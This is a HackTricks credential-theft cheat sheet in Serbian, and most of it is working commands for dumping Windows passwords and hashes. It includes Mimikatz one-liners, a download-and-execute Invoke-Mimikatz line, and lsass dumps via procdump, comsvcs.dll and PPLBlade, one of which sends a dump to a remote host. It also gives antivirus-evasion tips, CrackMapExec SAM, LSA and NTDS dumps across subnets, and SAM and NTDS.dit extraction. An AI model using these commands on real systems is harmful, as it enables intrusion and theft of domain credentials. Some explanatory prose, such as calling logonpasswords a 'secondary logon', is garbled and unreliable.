# Stealing Windows Credentials

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Mimikatz akreditacije

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Pronađite druge stvari koje Mimikatz može uraditi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Saznajte o nekim mogućim zaštitama za pristupne podatke ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti izvlačenje nekih pristupnih podataka pomoću alata Mimikatz.**

## Pristupni podaci sa Meterpreterom

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji sam kreirao da biste pretražili lozinke i hešove** unutar žrtve.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Zaobilaženje AV

### Procdump + Mimikatz

Kako je **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitimni Microsoft alat**, nije otkriven od strane Defendera.\
Možete koristiti ovaj alat da **dampirate lsass proces**, **preuzmete dump** i **izvučete** **lokalno** kredencijale iz dumpa.

{% code title="Dampiranje lsass" %}
```
```
{% endcode %}

```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

{% code title="Izdvajanje podataka za prijavljivanje iz dump-a" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Ovaj proces se automatski izvršava pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** programi mogu **detektovati** kao **zlonamerno** korišćenje **procdump.exe za dumpovanje lsass.exe**, to je zato što detektuju stringove **"procdump.exe" i "lsass.exe"**. Zato je **diskretnije** proslediti **PID** lsass.exe procesa kao **argument** procdump-u **umesto** imena lsass.exe.

### Dumpovanje lsass pomoću **comsvcs.dll**

DLL fajl pod nazivom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` je odgovoran za **dumpovanje memorije procesa** u slučaju pada. Ovaj DLL sadrži funkciju pod nazivom **`MiniDumpW`**, koja se poziva pomoću `rundll32.exe`.\
Prva dva argumenta su nebitna, ali treći argument se sastoji od tri komponente. Prva komponenta predstavlja ID procesa koji će biti dumpovan, druga komponenta predstavlja lokaciju fajla za dump, a treća komponenta je strogo reč **full**. Ne postoje alternativne opcije.\
Nakon parsiranja ovih tri komponente, DLL kreira fajl za dumpovanje i prenosi memoriju određenog procesa u taj fajl.\
Korišćenje **comsvcs.dll** je moguće za dumpovanje lsass procesa, čime se eliminiše potreba za otpremanjem i izvršavanjem procdump-a. Ovaj metod je detaljno opisan na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Za izvršavanje se koristi sledeća komanda:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Izbacivanje lsass-a pomoću Task Manager-a**

1. Desni klik na Task Bar i kliknite na Task Manager
2. Kliknite na Više detalja
3. Pretražite proces "Local Security Authority Process" na kartici Procesi
4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".

### Izbacivanje lsass-a pomoću procdump-a

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumpiranje lsass-a pomoću PPLBlade-a

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpiranje zaštićenih procesa koji podržava obfuskaciju memorijskog dumpa i prenos na udaljene radne stanice bez otpuštanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfuskacija datoteka memorijskog dumpa kako bi se izbegli mehanizmi detekcije na osnovu potpisa Defender-a
3. Prenos memorijskog dumpa pomoću metoda RAW i SMB bez otpuštanja na disk (bezdatotečni dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dumpovanje SAM heševa

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Preuzimanje LSA tajni

Kada je reč o krađi legitimacija, jedna od metoda koju možete koristiti je preuzimanje LSA (Local Security Authority) tajni. LSA tajne su čuvane na Windows operativnom sistemu i sadrže osetljive informacije kao što su korisnička imena i lozinke.

Da biste preuzeli LSA tajne, možete koristiti alat kao što je "Mimikatz". Ovaj alat omogućava da se izvrši "sekundarni logon" na Windows mašini i preuzmu LSA tajne.

Evo kako možete izvršiti ovu tehniku:

1. Preuzmite "Mimikatz" alat sa zvanične web stranice.
2. Pokrenite "Mimikatz" alat na ciljnom Windows sistemu.
3. Izvršite "sekundarni logon" komandom `sekurlsa::logonpasswords`.
4. Prikupite preuzete LSA tajne koje sadrže korisnička imena i lozinke.

Važno je napomenuti da je ova tehnika ilegalna i može biti kršenje privatnosti. Upotreba ovog alata treba biti u skladu sa zakonima i regulativama.

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dumpujte NTDS.dit sa ciljnog DC-a

Da biste izvršili ovu tehniku, možete koristiti alat kao što je `mimikatz` ili `ntdsutil`. Ovi alati omogućavaju izvlačenje NTDS.dit baze podataka sa ciljnog kontrolera domena (DC).

#### Korišćenje alata `mimikatz`

1. Preuzmite `mimikatz` alat sa [zvanične GitHub stranice](https://github.com/gentilkiwi/mimikatz/releases).
2. Pokrenite `mimikatz` alat na ciljnom DC-u.
3. Unesite komandu `lsadump::dcsync /domain:<ime domena>` kako biste izvršili izvlačenje NTDS.dit baze podataka.

#### Korišćenje alata `ntdsutil`

1. Pokrenite `cmd.exe` kao administrator na ciljnom DC-u.
2. Unesite komandu `ntdsutil` kako biste pokrenuli `ntdsutil` alat.
3. Unesite komandu `activate instance ntds` kako biste aktivirali instancu NTDS.dit baze podataka.
4. Unesite komandu `ifm` kako biste prešli u režim "Install from Media".
5. Unesite komandu `create full <putanja>` kako biste kreirali punu kopiju NTDS.dit baze podataka na određenoj putanji.

Nakon izvršenja ovih koraka, dobićete kopiju NTDS.dit baze podataka sa ciljnog DC-a. Ova baza podataka sadrži hash-ove korisničkih naloga i može se koristiti za dalje analize i napade na sistem.

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Preuzmite istoriju lozinki NTDS.dit sa ciljnog DC-a

Da biste preuzeli istoriju lozinki NTDS.dit sa ciljnog kontrolera domena (DC), možete koristiti sledeće korake:

1. Pokrenite alat `ntdsutil` na ciljnom DC-u.
2. Unesite komandu `activate instance ntds` kako biste aktivirali instancu NTDS.
3. Unesite komandu `ifm` kako biste prešli na režim instalacije izolovane mape.
4. Unesite komandu `create full C:\path\to\output` kako biste kreirali izolovanu mapu sa punim sadržajem.
5. Unesite komandu `quit` kako biste izašli iz režima instalacije izolovane mape.
6. Unesite komandu `quit` kako biste izašli iz alata `ntdsutil`.

Nakon izvršavanja ovih koraka, istorija lozinki NTDS.dit će biti preuzeta i smeštena u izolovanu mapu koju ste odredili.

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Prikazivanje atributa pwdLastSet za svaki NTDS.dit nalog

Da biste prikazali atribut pwdLastSet za svaki NTDS.dit nalog, možete koristiti sledeći PowerShell skript:

```powershell
$ntds = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetDirectoryEntry()
$searcher = New-Object System.DirectoryServices.DirectorySearcher($ntds)
$searcher.Filter = "(objectClass=user)"
$searcher.PropertiesToLoad.Add("pwdLastSet")

$results = $searcher.FindAll()

foreach ($result in $results) {
    $user = $result.GetDirectoryEntry()
    $pwdLastSet = [System.DateTime]::FromFileTime($user.Properties["pwdLastSet"].Value)

    Write-Host "Account: $($user.Properties["sAMAccountName"].Value)"
    Write-Host "pwdLastSet: $pwdLastSet"
    Write-Host ""
}

$searcher.Dispose()
```

Ovaj skript će prikazati atribut pwdLastSet za svaki NTDS.dit nalog, zajedno sa odgovarajućim korisničkim imenom (sAMAccountName).

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Krađa SAM i SYSTEM fajlova

Ovi fajlovi se **nalaze** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati** jer su zaštićeni.

### Iz registra

Najlakši način da ukradete ove fajlove je da dobijete kopiju iz registra:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Preuzmite** te datoteke na vaš Kali uređaj i **izvucite hešove** koristeći:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Kopiranje senke zapisa

Možete izvršiti kopiranje zaštićenih datoteka koristeći ovu uslugu. Potrebno je da budete Administrator.

#### Korišćenje vssadmin

Binarna datoteka vssadmin je dostupna samo u verzijama Windows Servera.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ali isto možete uraditi i iz **Powershell**-a. Ovo je primer **kako kopirati SAM fajl** (hard disk koji se koristi je "C:" i čuva se na C:\users\Public), ali možete koristiti ovo za kopiranje bilo kog zaštićenog fajla:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Konačno, takođe možete koristiti [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit fajlova.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

Fajl **NTDS.dit** poznat je kao srce **Active Directory-ja**, u kojem se čuvaju ključni podaci o korisničkim objektima, grupama i njihovim članstvima. Tu se čuvaju **heševi lozinki** za korisnike domena. Ovaj fajl je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na putanji _**%SystemRoom%/NTDS/ntds.dit**_.

U ovoj bazi podataka održavaju se tri osnovne tabele:

* **Data Table**: Ova tabela čuva detalje o objektima kao što su korisnici i grupe.
* **Link Table**: Prati odnose, poput članstva u grupama.
* **SD Table**: Ovde se čuvaju **bezbednosni deskriptori** za svaki objekat, obezbeđujući bezbednost i kontrolu pristupa za čuvane objekte.

Više informacija o tome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tim fajlom, a koristi ga _lsass.exe_. Zatim, **deo** fajla **NTDS.dit** može se nalaziti **unutar memorije `lsass`-a** (možete pronaći najskorije pristupljene podatke verovatno zbog poboljšanja performansi korišćenjem **keša**).

#### Dekriptovanje heševa unutar NTDS.dit

Heš je šifrovan 3 puta:

1. Dekriptujte ključ za šifrovanje lozinke (**PEK**) koristeći **BOOTKEY** i **RC4**.
2. Dekriptujte **heš** koristeći **PEK** i **RC4**.
3. Dekriptujte **heš** koristeći **DES**.

**PEK** ima **istu vrednost** na **svakom kontroloru domena**, ali je **šifrovan** unutar fajla **NTDS.dit** koristeći **BOOTKEY** iz **SYSTEM fajla kontrolora domena (razlikuje se između kontrolora domena)**. Zato da biste dobili akreditive iz NTDS.dit fajla **potrebni su vam fajlovi NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit pomoću Ntdsutil

Dostupno od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Takođe možete koristiti trik sa [**kopiranjem kopije senke zapisa**](./#stealing-sam-and-system) da biste kopirali datoteku **ntds.dit**. Zapamtite da će vam takođe biti potrebna kopija datoteke **SYSTEM** (ponovo, [**izvucite je iz registra ili koristite trik sa kopiranjem kopije senke zapisa**](./#stealing-sam-and-system)).

### **Izdvajanje heševa iz NTDS.dit**

Kada ste **dobili** datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate poput _secretsdump.py_ da biste **izvukli heševe**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Takođe možete **automatski izvući** koristeći važećeg korisnika sa administratorskim privilegijama na domenu:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Za **velike NTDS.dit datoteke** preporučuje se da se izvuku koristeći [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Takođe, možete koristiti **metasploit modul**: _post/windows/gather/credentials/domain\_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit u SQLite bazu podataka**

NTDS objekti mogu se izdvojiti u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se izdvajaju tajne, već i celokupni objekti i njihove atribute za dalje izdvajanje informacija kada je sirova NTDS.dit datoteka već preuzeta.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` košnica je opcionalna, ali omogućava dešifrovanje tajni (NT i LM heševa, dodatnih akreditacija kao što su lozinke u čistom tekstu, kerberos ili ključevi poverenja, NT i LM istorija lozinki). Pored ostalih informacija, izvučeni su sledeći podaci: korisnički i mašinski nalozi sa njihovim heševima, UAC oznake, vremenska oznaka za poslednju prijavu i promenu lozinke, opis naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstvo, povereni domeni sa vrstama poverenja, smerom i atributima...

## Lazagne

Preuzmite binarnu datoteku sa [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovu binarnu datoteku da izvučete akreditive iz različitog softvera.

```
lazagne.exe all
```

## Ostali alati za izvlačenje akreditacija iz SAM i LSASS

### Windows Credentials Editor (WCE)

Ovaj alat se može koristiti za izvlačenje akreditacija iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvucite akreditacije iz SAM datoteke

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Izvucite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Preuzmite ga sa: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i samo **izvršite ga** i lozinke će biti izvučene.

## Odbrane

[**Saznajte nešto o zaštiti akreditacija ovde.**](credentials-protections.md)

<details>

<summary><strong>Naučite AWS hakovanje od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
